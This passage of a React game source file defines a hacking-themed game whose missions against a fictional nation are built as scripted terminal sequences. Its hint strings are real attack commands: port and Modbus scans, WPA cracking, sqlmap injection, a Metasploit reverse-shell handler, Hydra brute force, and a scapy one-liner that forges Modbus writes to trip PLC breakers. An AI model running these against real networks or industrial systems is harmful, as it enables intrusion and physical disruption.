import { useState, useEffect, useRef } from "react";

const FONT = `@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap');`;

const CSS = `
${FONT}
* { box-sizing: border-box; margin: 0; padding: 0; }
:root {
  --bg: #020a0f; --panel: #040e17; --border: #0d3a52;
  --accent: #00e5ff; --accent2: #ff3c5f; --accent3: #39ff14; --accent4: #ffd600;
  --text: #b0cfe0; --dim: #2a5f78;
  --glow: 0 0 12px #00e5ff88; --glow2: 0 0 12px #ff3c5f88; --glow3: 0 0 12px #39ff1488;
}
body { background: var(--bg); color: var(--text); font-family: 'Share Tech Mono', monospace; overflow: hidden; }
.scanlines { pointer-events:none; position:fixed; inset:0; z-index:9999; background:repeating-linear-gradient(to bottom,transparent 0,transparent 2px,rgba(0,0,0,.15) 2px,rgba(0,0,0,.15) 4px); }
.screen { width:100vw; height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; position:relative; overflow:hidden; }
.boot-bg { position:absolute; inset:0; background:radial-gradient(ellipse at 50% 60%,#001a2e 0%,#020a0f 70%); }
.boot-grid { position:absolute; inset:0; background-image:linear-gradient(var(--border) 1px,transparent 1px),linear-gradient(90deg,var(--border) 1px,transparent 1px); background-size:40px 40px; opacity:.3; animation:gP 4s ease-in-out infinite; }
@keyframes gP { 0%,100%{opacity:.2} 50%{opacity:.4} }
.logo-title { font-family:'Orbitron',monospace; font-size:clamp(2rem,7vw,5rem); font-weight:900; letter-spacing:.15em; color:var(--accent); text-shadow:0 0 30px #00e5ff,0 0 60px #00e5ff66; animation:tP 2s ease-in-out infinite; }
@keyframes tP { 0%,100%{text-shadow:0 0 30px #00e5ff,0 0 60px #00e5ff66} 50%{text-shadow:0 0 50px #00e5ff,0 0 100px #00e5ff88} }
.logo-sub { font-family:'Rajdhani',sans-serif; font-size:clamp(.7rem,2vw,1rem); letter-spacing:.5em; color:var(--accent2); margin-top:6px; text-shadow:var(--glow2); }
.boot-btn { margin-top:48px; font-family:'Orbitron',monospace; font-size:.9rem; letter-spacing:.3em; color:var(--accent3); background:transparent; border:1.5px solid var(--accent3); padding:14px 44px; cursor:pointer; box-shadow:0 0 18px #39ff1433; transition:all .2s; animation:bB 1.5s ease-in-out infinite; }
.boot-btn:hover { background:#39ff1422; }
@keyframes bB { 0%,100%{opacity:1} 50%{opacity:.6} }
.corner { position:absolute; width:40px; height:40px; border-color:var(--accent); border-style:solid; opacity:.4; }
.corner-tl{top:20px;left:20px;border-width:2px 0 0 2px} .corner-tr{top:20px;right:20px;border-width:2px 2px 0 0}
.corner-bl{bottom:20px;left:20px;border-width:0 0 2px 2px} .corner-br{bottom:20px;right:20px;border-width:0 2px 2px 0}
.hud-line { position:absolute; font-size:.6rem; color:var(--dim); letter-spacing:.2em; opacity:.6; }
.hud-tl{top:28px;left:72px} .hud-tr{top:28px;right:72px;text-align:right} .hud-bl{bottom:28px;left:72px} .hud-br{bottom:28px;right:72px;text-align:right}
.brief-header { width:100%; background:#020d15; border-bottom:1px solid var(--border); padding:12px 24px; display:flex; align-items:center; justify-content:space-between; }
.brief-title { font-family:'Orbitron',monospace; color:var(--accent); font-size:.85rem; letter-spacing:.3em; }
.brief-body { flex:1; overflow-y:auto; padding:24px; width:100%; max-width:860px; }
.brief-mission-tag { display:inline-block; font-size:.6rem; letter-spacing:.4em; color:var(--accent2); border:1px solid var(--accent2); padding:3px 12px; margin-bottom:18px; }
.brief-heading { font-family:'Orbitron',monospace; font-size:clamp(1rem,3vw,1.6rem); color:#fff; margin-bottom:12px; line-height:1.3; }
.brief-text { font-family:'Rajdhani',sans-serif; font-size:1rem; line-height:1.7; color:var(--text); margin-bottom:16px; }
.obj-item { display:flex; align-items:flex-start; gap:10px; margin-bottom:10px; font-family:'Rajdhani',sans-serif; font-size:.95rem; }
.obj-icon { color:var(--accent3); min-width:16px; }
.threat-bar { background:#010911; border:1px solid var(--border); padding:14px 18px; margin:16px 0; }
.threat-label { font-size:.6rem; letter-spacing:.35em; color:var(--dim); margin-bottom:8px; }
.threat-seg { height:6px; flex:1; border-radius:1px; }
.threat-seg.active { background:var(--accent2); box-shadow:var(--glow2); }
.threat-seg.inactive { background:#1a3a4a; }
.btn-primary { font-family:'Orbitron',monospace; font-size:.75rem; letter-spacing:.25em; color:var(--bg); background:var(--accent); border:none; padding:13px 28px; cursor:pointer; transition:all .2s; font-weight:bold; }
.btn-primary:hover { background:#33eeff; }
.btn-secondary { font-family:'Orbitron',monospace; font-size:.75rem; letter-spacing:.25em; color:var(--accent); background:transparent; border:1px solid var(--accent); padding:13px 28px; cursor:pointer; transition:all .2s; }
.btn-secondary:hover { background:#00e5ff11; }
.game-screen { flex-direction:column; padding:0; overflow:hidden; }
.game-topbar { width:100%; background:#020d15; border-bottom:1px solid var(--border); display:flex; align-items:center; justify-content:space-between; padding:8px 16px; flex-shrink:0; z-index:10; }
.game-logo { font-family:'Orbitron',monospace; font-size:.7rem; letter-spacing:.3em; color:var(--accent); }
.stat-row { display:flex; gap:18px; align-items:center; }
.stat { display:flex; align-items:center; gap:6px; font-size:.65rem; }
.stat-label { color:var(--dim); }
.stat-val { color:var(--accent); font-family:'Orbitron',monospace; font-size:.7rem; }
.stat-val.danger { color:var(--accent2); animation:pulse 1s infinite; }
@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.5} }
.game-body { flex:1; display:flex; overflow:hidden; min-height:0; }
.side-nav { width:200px; background:#020d15; border-right:1px solid var(--border); display:flex; flex-direction:column; padding:12px 0; flex-shrink:0; }
.nav-section-label { font-size:.55rem; letter-spacing:.4em; color:var(--dim); padding:8px 16px 4px; }
.nav-item { display:flex; align-items:center; gap:10px; padding:10px 16px; cursor:pointer; transition:all .15s; font-size:.75rem; letter-spacing:.1em; color:var(--text); border-left:2px solid transparent; position:relative; }
.nav-item:hover { background:#051828; color:var(--accent); }
.nav-item.active { background:#061d2d; border-left-color:var(--accent); color:var(--accent); }
.nav-item.locked { color:var(--dim); cursor:not-allowed; }
.nav-badge { position:absolute; right:12px; top:50%; transform:translateY(-50%); background:var(--accent2); color:var(--bg); font-size:.5rem; padding:2px 5px; font-family:'Orbitron',monospace; }
.nav-icon { font-size:1rem; width:18px; text-align:center; }
.main-panel { flex:1; display:flex; flex-direction:column; overflow:hidden; min-width:0; }
.side-panel { width:240px; background:#020d15; border-left:1px solid var(--border); display:flex; flex-direction:column; overflow:hidden; flex-shrink:0; }
.sp-section { border-bottom:1px solid var(--border); padding:12px; }
.sp-title { font-size:.55rem; letter-spacing:.4em; color:var(--dim); margin-bottom:10px; }
.intel-item { display:flex; align-items:flex-start; gap:8px; margin-bottom:8px; font-size:.7rem; line-height:1.4; font-family:'Rajdhani',sans-serif; }
.intel-dot { width:6px; height:6px; border-radius:50%; background:var(--accent2); margin-top:4px; flex-shrink:0; animation:pulse 1.5s infinite; }
.intel-dot.green { background:var(--accent3); }
.intel-dot.yellow { background:var(--accent4); }
.hack-panel { flex:1; overflow-y:auto; padding:16px 20px; background:#010911; display:flex; flex-direction:column; }
.hack-title { font-family:'Orbitron',monospace; font-size:1rem; color:var(--accent); margin-bottom:4px; letter-spacing:.2em; }
.hack-sub { font-family:'Rajdhani',sans-serif; font-size:.9rem; color:var(--dim); margin-bottom:12px; }
.tool-chips { display:flex; flex-wrap:wrap; gap:6px; margin-bottom:14px; }
.tool-chip { font-size:.6rem; letter-spacing:.15em; color:var(--accent4); border:1px solid #2a3a10; background:#0a1200; padding:3px 9px; }
.tool-chip.used { color:var(--accent3); border-color:var(--accent3); background:#001200; }
.terminal-wrap { display:flex; flex-direction:column; min-height:0; border:1px solid var(--border); background:#000d14; flex:1; }
.terminal-out { flex:1; overflow-y:auto; padding:14px; font-family:'Share Tech Mono',monospace; font-size:.78rem; min-height:180px; max-height:340px; }
.t-line { line-height:1.7; white-space:pre-wrap; word-break:break-all; }
.t-err { color:var(--accent2); }
.t-warn { color:var(--accent4); }
.t-ok { color:var(--accent3); }
.t-cmd { color:#fff; }
.t-dim { color:var(--dim); }
.t-accent { color:var(--accent); }
.t-sys { color:#4a8fa8; }
.term-input-row { display:flex; align-items:center; gap:8px; border-top:1px solid var(--border); padding:8px 14px; flex-shrink:0; }
.term-prompt { color:var(--accent); font-size:.8rem; white-space:nowrap; flex-shrink:0; }
.term-input { flex:1; background:transparent; border:none; outline:none; font-family:'Share Tech Mono',monospace; font-size:.82rem; color:var(--accent3); caret-color:var(--accent); min-width:0; }
.step-track { display:flex; gap:4px; margin-bottom:12px; }
.step-dot { height:4px; flex:1; border-radius:2px; background:#0d2535; transition:background .3s; }
.step-dot.done { background:var(--accent3); }
.step-dot.active { background:var(--accent); box-shadow:var(--glow); }
.cmd-hint { background:#000d14; border:1px solid #0d2535; border-left:2px solid var(--accent4); padding:8px 12px; margin-bottom:10px; font-size:.7rem; }
.cmd-hint-label { color:var(--dim); letter-spacing:.2em; font-size:.6rem; margin-bottom:3px; }
.cmd-hint-val { color:var(--accent4); }
.progress-wrap { margin:10px 0; }
.progress-label { display:flex; justify-content:space-between; font-size:.65rem; letter-spacing:.15em; color:var(--dim); margin-bottom:5px; }
.progress-track { height:4px; background:#0d2535; border-radius:1px; overflow:hidden; }
.progress-fill { height:100%; border-radius:1px; transition:width .4s; }
.pf-cyan{background:var(--accent)} .pf-red{background:var(--accent2)} .pf-green{background:var(--accent3)} .pf-yellow{background:var(--accent4)}
.map-card { background:#030e18; border:1px solid var(--border); padding:14px; cursor:pointer; transition:all .2s; }
.map-card:hover { border-color:var(--accent); background:#051828; }
.map-card.done { border-color:#39ff1433; background:#010f07; }
.map-card.active-hack { border-color:var(--accent); box-shadow:var(--glow); }
.map-card.locked { opacity:.4; cursor:not-allowed; }
.modal-overlay { position:fixed; inset:0; background:#000000cc; z-index:1000; display:flex; align-items:center; justify-content:center; backdrop-filter:blur(2px); }
.modal { background:#020d15; border:1px solid var(--accent); max-width:520px; width:90%; padding:28px; position:relative; }
.modal-title { font-family:'Orbitron',monospace; color:var(--accent); font-size:1rem; letter-spacing:.2em; margin-bottom:8px; }
.modal-body { font-family:'Rajdhani',sans-serif; font-size:.95rem; color:var(--text); line-height:1.7; margin-bottom:20px; }
.alert-bar { position:fixed; top:48px; left:50%; transform:translateX(-50%); z-index:2000; background:#0a0005; border:1px solid var(--accent2); color:var(--accent2); font-family:'Orbitron',monospace; font-size:.7rem; letter-spacing:.2em; padding:10px 24px; box-shadow:var(--glow2); animation:sD .3s; white-space:nowrap; }
@keyframes sD { from{transform:translateX(-50%) translateY(-20px);opacity:0} to{transform:translateX(-50%) translateY(0);opacity:1} }
.story-panel { padding:20px; overflow-y:auto; flex:1; font-family:'Rajdhani',sans-serif; }
.story-chapter { font-size:.6rem; letter-spacing:.5em; color:var(--accent2); margin-bottom:8px; }
.story-title { font-family:'Orbitron',monospace; font-size:1.2rem; color:#fff; margin-bottom:16px; line-height:1.3; }
.story-para { font-size:.95rem; line-height:1.8; color:var(--text); margin-bottom:14px; }
.complete-title { font-family:'Orbitron',monospace; font-size:clamp(1.5rem,4vw,3rem); color:var(--accent3); text-shadow:0 0 30px #39ff14; text-align:center; animation:tP 2s infinite; }
.score-card { background:#020d15; border:1px solid var(--border); padding:20px 28px; text-align:center; }
.score-val { font-family:'Orbitron',monospace; font-size:1.8rem; color:var(--accent); display:block; }
.score-lbl { font-size:.65rem; letter-spacing:.3em; color:var(--dim); margin-top:4px; display:block; }
.asset-grid { display:grid; grid-template-columns:1fr 1fr; gap:6px; }
.asset-card { background:#010911; border:1px solid var(--border); padding:8px; }
.asset-card.unlocked { border-color:var(--accent3); }
.asset-icon { font-size:1.2rem; margin-bottom:4px; }
.asset-name { font-size:.6rem; letter-spacing:.1em; color:var(--text); }
.asset-cd { font-size:.55rem; color:var(--dim); margin-top:2px; }
.asset-cd.ready { color:var(--accent3); }
@media (max-width:768px) {
  .side-nav { width:52px; }
  .nav-item span:not(.nav-icon) { display:none; }
  .nav-badge,.nav-section-label { display:none; }
  .side-panel { display:none; }
}
@media (max-width:480px) { .side-nav { display:none; } }
`;

// =========================================================
// TERMINAL MISSION DATA — Real hacking tool chains
// =========================================================
const TERMINAL_MISSIONS = {
  radar: {
    toolsUsed: ["nmap", "wireshark", "aircrack-ng", "sudo"],
    intro: [
      { t: "accent", v: "SPECTER-7 Terminal v4.1 // KAIROS-RADAR Interface" },
      { t: "sys", v: "Target: Kovalon SKYWATCHER Air Defense Network" },
      { t: "sys", v: "IP Range: 10.44.0.0/16  |  Status: HOSTILE" },
      { t: "dim", v: "────────────────────────────────────────" },
      { t: "warn", v: "[OBJECTIVE] Blind the radar grid without triggering killswitch" },
      { t: "dim", v: "" },
    ],
    steps: [
      {
        tool: "nmap", label: "RECON — Scan the radar network for open ports & services",
        hint: "nmap -sS -p 1-65535 10.44.0.1",
        accept: ["nmap"],
        response: [
          { t: "cmd", v: "$ nmap -sS -p 1-65535 10.44.0.1" },
          { t: "dim", v: "Starting Nmap 7.94 ( https://nmap.org )" },
          { t: "dim", v: "Scanning 10.44.0.1 [65535 ports]..." },
          { t: "sys", v: "PORT      STATE  SERVICE      VERSION" },
          { t: "ok", v: "22/tcp    open   ssh          OpenSSH 8.9" },
          { t: "ok", v: "443/tcp   open   https        nginx/1.22" },
          { t: "ok", v: "5005/tcp  open   radar-ctrl   SKYWATCHER-API v2.1" },
          { t: "ok", v: "9200/tcp  open   radar-feed   ElasticSearch 8.4" },
          { t: "warn", v: "11337/tcp open   admin-panel  KAIROS-MGMT" },
          { t: "dim", v: "MAC: DE:AD:BE:EF:44:01 (Kovalon Defense)" },
          { t: "ok", v: "[DONE] 5 open ports found on SKYWATCHER node" },
        ]
      },
      {
        tool: "wireshark", label: "INTERCEPT — Capture radar control packets with Wireshark",
        hint: "wireshark -i eth0 -f 'host 10.44.0.1 and port 5005' -w radar_cap.pcap",
        accept: ["wireshark", "tshark"],
        response: [
          { t: "cmd", v: "$ wireshark -i eth0 -f 'host 10.44.0.1 and port 5005' -w radar_cap.pcap" },
          { t: "dim", v: "Wireshark 4.2.0 — live capture started on eth0" },
          { t: "dim", v: "Filter: host 10.44.0.1 AND port 5005" },
          { t: "sys", v: "[001] TCP  10.44.0.1:5005 → CMD: PING_SWEEP SRC=192.168.1.4" },
          { t: "sys", v: "[002] TCP  10.44.0.1:5005 → CMD: TRACK_VECTOR id=F-22 alt=8200m" },
          { t: "warn", v: "[003] TCP  10.44.0.1:5005 → AUTH_TOKEN: KVL-7734-FFEC (32-byte)" },
          { t: "sys", v: "[004] TCP  10.44.0.1:5005 → CMD: SECTOR_LOCK zone=ALPHA-4" },
          { t: "dim", v: "" },
          { t: "ok", v: "[CAPTURED] 1,847 packets — radar_cap.pcap saved" },
          { t: "ok", v: "[FOUND] Auth token extracted: KVL-7734-FFEC" },
        ]
      },
      {
        tool: "aircrack-ng", label: "CRACK — Crack WPA2 radar auth key from packet capture",
        hint: "aircrack-ng -b DE:AD:BE:EF:44:01 radar_cap.pcap",
        accept: ["aircrack", "aircrack-ng"],
        response: [
          { t: "cmd", v: "$ aircrack-ng -b DE:AD:BE:EF:44:01 radar_cap.pcap" },
          { t: "dim", v: "Aircrack-ng 1.7 — WPA2 crack mode" },
          { t: "dim", v: "BSSID: DE:AD:BE:EF:44:01  ESSID: SKYWATCHER-CTRL" },
          { t: "dim", v: "Loaded 14,344,391 words from rockyou.txt" },
          { t: "warn", v: "Testing keys... [████████████░░░░] 72%" },
          { t: "dim", v: "" },
          { t: "ok", v: "KEY FOUND! [ koval0n_sky_4491 ]" },
          { t: "ok", v: "WPA2 passphrase cracked in 34 seconds" },
          { t: "ok", v: "[ACCESS] Radar management interface now unlocked" },
        ]
      },
      {
        tool: "sudo", label: "ATTACK — Inject 400 ghost aircraft tracks into radar feed",
        hint: "sudo python3 inject_false_tracks.py --target 10.44.0.1 --key koval0n_sky_4491",
        accept: ["sudo", "python3", "python"],
        response: [
          { t: "cmd", v: "$ sudo python3 inject_false_tracks.py --target 10.44.0.1 --key koval0n_sky_4491" },
          { t: "dim", v: "[sudo] privilege escalation granted" },
          { t: "dim", v: "Authenticating to SKYWATCHER-API..." },
          { t: "ok", v: "[AUTH] Session token accepted" },
          { t: "dim", v: "Injecting 400 ghost aircraft tracks into radar feed..." },
          { t: "sys", v: "  → Ghost #001: MiG-31  bearing 047  alt=12,000m" },
          { t: "sys", v: "  → Ghost #002: Su-57   bearing 183  alt=8,500m" },
          { t: "sys", v: "  → Ghosts #003–400: FLOODING sectors ALPHA–DELTA" },
          { t: "dim", v: "" },
          { t: "ok", v: "[SUCCESS] SKYWATCHER tracking 400 phantom aircraft" },
          { t: "ok", v: "[SUCCESS] Real allied planes invisible to Kovalon ATC" },
          { t: "ok", v: "[MISSION COMPLETE] BLIND EAGLE — AIR DEFENSE: COMPROMISED ██" },
        ]
      }
    ]
  },

  economy: {
    toolsUsed: ["nmap", "sqlmap", "metasploit", "sudo"],
    intro: [
      { t: "accent", v: "SPECTER-7 Terminal v4.1 // KAIROS-ECON Interface" },
      { t: "sys", v: "Target: Kovalon Financial Warfare System" },
      { t: "sys", v: "IP: 172.16.88.10  |  API: api.kovalon-natsec.fin" },
      { t: "dim", v: "────────────────────────────────────────" },
      { t: "warn", v: "[OBJECTIVE] Freeze war funds. Restore allied central banks." },
      { t: "dim", v: "" },
    ],
    steps: [
      {
        tool: "nmap", label: "VULN SCAN — Enumerate financial server attack surface",
        hint: "nmap -A -sV --script vuln 172.16.88.10",
        accept: ["nmap"],
        response: [
          { t: "cmd", v: "$ nmap -A -sV --script vuln 172.16.88.10" },
          { t: "dim", v: "Nmap vuln scan initiated..." },
          { t: "ok", v: "3306/tcp  open  mysql    MySQL 5.7.39" },
          { t: "ok", v: "8080/tcp  open  http     Apache Tomcat 9.0.12" },
          { t: "ok", v: "8443/tcp  open  https    KAIROS-ECON API v3" },
          { t: "dim", v: "" },
          { t: "warn", v: "VULNERABILITIES DETECTED:" },
          { t: "err", v: "| CVE-2023-46604  Apache ActiveMQ RCE   [CRITICAL 10.0]" },
          { t: "err", v: "| CVE-2021-41773  Path Traversal Apache  [HIGH 9.8]" },
          { t: "err", v: "| SQLi on /api/v3/accounts?id= endpoint  [CRITICAL]" },
          { t: "ok", v: "[DONE] 3 critical vulnerabilities confirmed" },
        ]
      },
      {
        tool: "sqlmap", label: "SQL INJECT — Dump war fund database via account API",
        hint: "sqlmap -u 'https://172.16.88.10:8443/api/v3/accounts?id=1' --dbs --batch",
        accept: ["sqlmap"],
        response: [
          { t: "cmd", v: "$ sqlmap -u 'https://172.16.88.10:8443/api/v3/accounts?id=1' --dbs --batch" },
          { t: "dim", v: "sqlmap 1.7.11 — automatic SQL injection & takeover tool" },
          { t: "dim", v: "[INFO] Testing GET parameter 'id'..." },
          { t: "warn", v: "[INFO] Parameter 'id' is injectable (boolean-based blind)" },
          { t: "sys", v: "[INJECT] Type: boolean-based blind" },
          { t: "sys", v: "[INJECT] Type: time-based blind" },
          { t: "sys", v: "[INJECT] Type: UNION query (4 columns)" },
          { t: "dim", v: "" },
          { t: "ok", v: "Available databases [3]:" },
          { t: "ok", v: "  [*] kairos_econ_prod" },
          { t: "ok", v: "  [*] war_fund_accounts" },
          { t: "ok", v: "  [*] allied_nation_targets" },
          { t: "ok", v: "[DUMPED] Full schema access acquired" },
        ]
      },
      {
        tool: "metasploit", label: "SHELL — Deploy Metasploit reverse shell for root access",
        hint: "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD java/shell_reverse_tcp; set LHOST 10.0.5.1; run'",
        accept: ["msfconsole", "msf", "metasploit"],
        response: [
          { t: "cmd", v: "$ msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD java/shell_reverse_tcp; run'" },
          { t: "dim", v: "" },
          { t: "accent", v: "       =[ metasploit v6.3.44 ]" },
          { t: "dim", v: "       +-- --=[ 2374 exploits / 1232 auxiliary ]=--" },
          { t: "dim", v: "" },
          { t: "sys", v: "msf6 exploit(multi/handler) > run" },
          { t: "dim", v: "[*] Started reverse TCP handler on 0.0.0.0:4444" },
          { t: "dim", v: "[*] Sending stage to 172.16.88.10" },
          { t: "ok", v: "[*] Meterpreter session 1 opened → 172.16.88.10:54021" },
          { t: "sys", v: "meterpreter > shell" },
          { t: "ok", v: "Process 4411 created. Root shell active." },
          { t: "ok", v: "[ROOT] Full shell on KAIROS-ECON acquired" },
        ]
      },
      {
        tool: "sudo", label: "EXECUTE — Freeze war funds and restore allied economies",
        hint: "sudo python3 freeze_warfunds.py --db war_fund_accounts --redirect allied_recovery",
        accept: ["sudo", "python3", "python"],
        response: [
          { t: "cmd", v: "$ sudo python3 freeze_warfunds.py --db war_fund_accounts --redirect allied_recovery" },
          { t: "dim", v: "[sudo] root on KAIROS-ECON" },
          { t: "dim", v: "Connecting to war_fund_accounts @ 172.16.88.10:3306..." },
          { t: "dim", v: "" },
          { t: "ok", v: "[TX-001] FREEZE  KVL-WARFUND-ARMAMENTS    $ 1,200,000,000" },
          { t: "ok", v: "[TX-002] FREEZE  KVL-WARFUND-LOGISTICS    $ 2,300,000,000" },
          { t: "ok", v: "[TX-003] FREEZE  KVL-WARFUND-INTEL-OPS    $   890,000,000" },
          { t: "ok", v: "[TX-004] FREEZE  KVL-WARFUND-MERCENARIES  $   310,000,000" },
          { t: "dim", v: "" },
          { t: "ok", v: "Total war funds frozen: $ 4,700,000,000" },
          { t: "ok", v: "[RESTORE] Allied Bank of Nordea — ONLINE" },
          { t: "ok", v: "[RESTORE] Federal Sovereign Reserve — ONLINE" },
          { t: "ok", v: "[MISSION COMPLETE] FROZEN ASSETS — ECONOMY: NEUTRALIZED ██" },
        ]
      }
    ]
  },

  comms: {
    toolsUsed: ["nmap", "hydra", "netcat", "ffmpeg", "sudo"],
    intro: [
      { t: "accent", v: "SPECTER-7 Terminal v4.1 // KAIROS-COMMS Interface" },
      { t: "sys", v: "Target: Kovalon State Propaganda Broadcast Network" },
      { t: "sys", v: "IP: 192.168.201.100  |  RTMP: rtmp://kvl-media/live/kvl1" },
      { t: "dim", v: "────────────────────────────────────────" },
      { t: "warn", v: "[OBJECTIVE] Hijack broadcast — push evidence of war crimes to 14M viewers" },
      { t: "dim", v: "" },
    ],
    steps: [
      {
        tool: "nmap", label: "RECON — Probe broadcast infrastructure & streaming endpoints",
        hint: "nmap -sU -p 161,1935,8554 --script rtsp-url-brute 192.168.201.100",
        accept: ["nmap"],
        response: [
          { t: "cmd", v: "$ nmap -sU -p 161,1935,8554 --script rtsp-url-brute 192.168.201.100" },
          { t: "dim", v: "Scanning broadcast server 192.168.201.100..." },
          { t: "ok", v: "161/udp   open   snmp      SNMP v2c community:public" },
          { t: "ok", v: "1935/tcp  open   rtmp      Adobe RTMP (Live Streaming)" },
          { t: "ok", v: "8554/tcp  open   rtsp      RTSP stream server" },
          { t: "ok", v: "8080/tcp  open   http      Admin Panel (Basic Auth)" },
          { t: "dim", v: "" },
          { t: "warn", v: "SNMP sysDescr: Kovalon Media Hub v2 / CentOS 7.9" },
          { t: "ok", v: "[FOUND] RTMP endpoint: rtmp://192.168.201.100/live/kvl1" },
          { t: "ok", v: "[FOUND] Admin login page: http://192.168.201.100:8080/admin" },
        ]
      },
      {
        tool: "hydra", label: "BRUTE FORCE — Crack admin panel credentials with Hydra",
        hint: "hydra -l admin -P /opt/wordlists/darkweb2017.txt 192.168.201.100 http-post-form '/admin/login:user=^USER^&pass=^PASS^:F=Invalid'",
        accept: ["hydra"],
        response: [
          { t: "cmd", v: "$ hydra -l admin -P /opt/wordlists/darkweb2017.txt 192.168.201.100 http-post-form '/admin/login...'" },
          { t: "dim", v: "Hydra v9.5 — brute force attack on http-post-form" },
          { t: "dim", v: "[DATA] 16 threads, attacking 192.168.201.100:8080" },
          { t: "dim", v: "[ATTEMPT] admin:broadcast1     — FAIL" },
          { t: "dim", v: "[ATTEMPT] admin:kvlmedia22     — FAIL" },
          { t: "dim", v: "[ATTEMPT] admin:Pr0p4g4nd4!    — FAIL" },
          { t: "dim", v: "" },
          { t: "ok", v: "[8080][http-post-form] login: admin   password: Koval0n@Media2029" },
          { t: "ok", v: "1 valid credential found" },
        ]
      },
      {
        tool: "netcat", label: "STREAM — Pipe evidence package via netcat into RTMP feed",
        hint: "ffmpeg -re -i evidence_crimes.mp4 -vcodec copy -f flv rtmp://192.168.201.100/live/kvl1?auth=Koval0n@Media2029",
        accept: ["nc", "netcat", "ffmpeg", "curl"],
        response: [
          { t: "cmd", v: "$ ffmpeg -re -i evidence_crimes.mp4 -vcodec copy -f flv rtmp://192.168.201.100/live/kvl1?auth=..." },
          { t: "dim", v: "ffmpeg version 6.1 — RTMP stream encoder active" },
          { t: "dim", v: "Input: evidence_crimes.mp4 (1920x1080 H.264, 24fps, 18:44)" },
          { t: "dim", v: "Output: rtmp://192.168.201.100/live/kvl1" },
          { t: "dim", v: "" },
          { t: "sys", v: "frame=  124 fps=24 size=  4096kB time=00:00:05" },
          { t: "sys", v: "frame=  960 fps=24 size= 32768kB time=00:00:40" },
          { t: "ok", v: "[LIVE] Evidence streaming on all KVL state broadcast channels" },
          { t: "ok", v: "[LIVE] Estimated 14.2M viewers watching — protests beginning" },
        ]
      },
      {
        tool: "sudo", label: "LOCKOUT — Kill Kovalon broadcast and block recovery",
        hint: "sudo systemctl stop kvl-broadcast && sudo iptables -I OUTPUT -d 192.168.201.100 -j DROP",
        accept: ["sudo", "systemctl", "iptables"],
        response: [
          { t: "cmd", v: "$ sudo systemctl stop kvl-broadcast" },
          { t: "dim", v: "Stopping kvl-broadcast.service..." },
          { t: "ok", v: "[STOPPED] kvl-broadcast.service" },
          { t: "cmd", v: "$ sudo iptables -I OUTPUT -d 192.168.201.100 -j DROP" },
          { t: "dim", v: "[iptables] DROP rule inserted for 192.168.201.100" },
          { t: "dim", v: "" },
          { t: "ok", v: "[OFFLINE] KVL State TV Channel 1 — DARK" },
          { t: "ok", v: "[OFFLINE] KVL State TV Channel 2 — DARK" },
          { t: "ok", v: "[OFFLINE] KVL National Radio — DARK" },
          { t: "ok", v: "[BROADCAST] Evidence package looping on all channels" },
          { t: "ok", v: "[MISSION COMPLETE] STATIC VOICE — PROPAGANDA NETWORK: SEIZED ██" },
        ]
      }
    ]
  },

  grid: {
    toolsUsed: ["nmap", "wireshark", "scapy", "sudo"],
    intro: [
      { t: "accent", v: "SPECTER-7 Terminal v4.1 // KAIROS-GRID Interface" },
      { t: "sys", v: "Target: Kovalon Military Industrial Power Grid (SCADA/ICS)" },
      { t: "sys", v: "Network: 10.99.5.0/24  |  Protocol: ICS Modbus TCP" },
      { t: "dim", v: "────────────────────────────────────────" },
      { t: "warn", v: "[OBJECTIVE] Take military bases offline. Civilian grid MUST stay online." },
      { t: "err", v: "[CRITICAL] Hitting civilian nodes = mission abort + war crimes charge." },
      { t: "dim", v: "" },
    ],
    steps: [
      {
        tool: "nmap", label: "ICS SCAN — Discover SCADA Modbus TCP nodes on industrial network",
        hint: "nmap -sV --script modbus-discover -p 502 10.99.5.0/24",
        accept: ["nmap"],
        response: [
          { t: "cmd", v: "$ nmap -sV --script modbus-discover -p 502 10.99.5.0/24" },
          { t: "dim", v: "Scanning industrial SCADA network — Modbus TCP port 502..." },
          { t: "dim", v: "" },
          { t: "ok", v: "10.99.5.11  open  Modbus  Siemens S7-1500 PLC  [MILITARY BASE ALPHA]" },
          { t: "ok", v: "10.99.5.12  open  Modbus  Siemens S7-1500 PLC  [MILITARY BASE BRAVO]" },
          { t: "ok", v: "10.99.5.13  open  Modbus  ABB AC500 PLC        [MILITARY BASE CHARLIE]" },
          { t: "warn", v: "10.99.5.20  open  Modbus  Schneider M340       [CIVILIAN GRID] ← DO NOT TOUCH" },
          { t: "warn", v: "10.99.5.21  open  Modbus  Schneider M340       [CIVILIAN GRID] ← DO NOT TOUCH" },
          { t: "dim", v: "" },
          { t: "ok", v: "[MAP] 3 military targets / 2 civilian nodes — DO NOT hit .20 or .21" },
        ]
      },
      {
        tool: "wireshark", label: "INTERCEPT — Capture Modbus register write commands from SCADA traffic",
        hint: "wireshark -i eth0 -f 'tcp port 502' -w ics_traffic.pcap",
        accept: ["wireshark", "tshark"],
        response: [
          { t: "cmd", v: "$ wireshark -i eth0 -f 'tcp port 502' -w ics_traffic.pcap" },
          { t: "dim", v: "Wireshark — Modbus TCP capture on eth0" },
          { t: "dim", v: "" },
          { t: "sys", v: "[Modbus] 10.99.5.11 FC=03 ReadHoldingRegs   addr=0100 qty=10" },
          { t: "warn", v: "[Modbus] 10.99.5.11 FC=06 WriteSingleReg     addr=0200 val=0x00FF  ← BREAKER ON" },
          { t: "warn", v: "[Modbus] 10.99.5.12 FC=06 WriteSingleReg     addr=0200 val=0x00FF  ← BREAKER ON" },
          { t: "sys", v: "[Modbus] 10.99.5.20 FC=01 ReadCoils          ← CIVILIAN heartbeat" },
          { t: "dim", v: "" },
          { t: "ok", v: "[FOUND] Breaker control register: addr=0x0200" },
          { t: "ok", v: "[FOUND] Writing 0x0000 to addr 0x0200 will TRIP circuit breakers" },
        ]
      },
      {
        tool: "scapy", label: "CRAFT PACKET — Forge Modbus write packets to trip military breakers",
        hint: "sudo python3 -c \"from scapy.all import *; [send(IP(dst=h)/TCP(dport=502)/Raw(load=b'\\x00\\x01\\x00\\x00\\x00\\x06\\x01\\x06\\x02\\x00\\x00\\x00')) for h in ['10.99.5.11','10.99.5.12','10.99.5.13']]\"",
        accept: ["scapy", "python3", "python", "sudo"],
        response: [
          { t: "cmd", v: "$ sudo python3 -c \"from scapy.all import *; [send Modbus 0x0000 to .11,.12,.13]\"" },
          { t: "dim", v: "Scapy 2.5.0 — raw packet forge mode" },
          { t: "dim", v: "" },
